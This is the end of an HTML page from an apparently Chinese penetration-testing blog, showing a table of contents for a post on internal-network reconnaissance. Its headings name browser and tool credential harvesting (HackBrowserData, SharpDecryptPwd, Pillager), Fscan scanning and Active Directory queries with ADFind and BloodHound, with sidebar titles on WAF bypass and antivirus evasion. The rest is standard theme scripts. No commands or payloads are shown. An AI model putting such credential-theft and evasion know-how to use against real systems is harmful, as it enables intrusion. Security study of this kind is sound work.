href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8-HackBrowserData"><span class="toc-number">1.5.3.4.4.2.</span> <span class="toc-text">浏览器存储 HackBrowserData</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E5%AD%98%E5%82%A8-SharpDecryptPwd"><span class="toc-number">1.5.3.4.4.3.</span> <span class="toc-text">第三方工具存储 SharpDecryptPwd</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE-%E8%A7%81%E5%85%B7%E4%BD%93Web%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.3.4.4.4.</span> <span class="toc-text">Web应用相关配置 见具体Web程序</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.5.3.4.4.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">5.自动化工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA-searchall"><span class="toc-number">1.5.3.5.1.</span> <span class="toc-text">本机-searchall</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA-Pillager"><span class="toc-number">1.5.3.5.2.</span> <span class="toc-text">本机-Pillager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E7%82%B9-Fscan"><span class="toc-number">1.5.3.5.3.</span> <span class="toc-text">打点-Fscan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%BC%E5%90%88-ADfind"><span class="toc-number">1.5.3.5.4.</span> <span class="toc-text">综合-ADfind</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.3.5.4.1.</span> <span class="toc-text">域控查询</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.3.5.4.2.</span> <span class="toc-text">域用户查询</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E7%BB%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.3.5.4.3.</span> <span class="toc-text">域用户组查询</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E4%B8%AD%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.5.4.4.</span> <span class="toc-text">查询域中计算机信息</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89GPO"><span class="toc-number">1.5.3.5.4.5.</span> <span class="toc-text">查询所有GPO</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%BC%E5%90%88-BloodHound-%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%88%E6%8F%90%E4%BE%9B%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-number">1.5.3.5.5.</span> <span class="toc-text">综合-BloodHound -可视化（提供域渗透思路）</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7aba0c03.html" title="内网信息收集">内网信息收集</a><time datetime="2025-08-07T10:03:02.000Z" title="发表于 2025-08-07 18:03:02">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7f69f64e.html" title="SQL注入绕waf总结">SQL注入绕waf总结</a><time datetime="2025-08-07T10:02:25.000Z" title="发表于 2025-08-07 18:02:25">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/633b4305.html" title="春秋云镜–Aoselu">春秋云镜–Aoselu</a><time datetime="2025-08-07T09:50:14.000Z" title="发表于 2025-08-07 17:50:14">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/633b4305.html" title="cyberstrikelab-lab9">cyberstrikelab-lab9</a><time datetime="2025-08-07T09:46:52.000Z" title="发表于 2025-08-07 17:46:52">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/59f11f31.html" title="fscan免杀（脚本小子版）">fscan免杀（脚本小子版）</a><time datetime="2025-08-07T09:35:55.000Z" title="发表于 2025-08-07 17:35:55">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
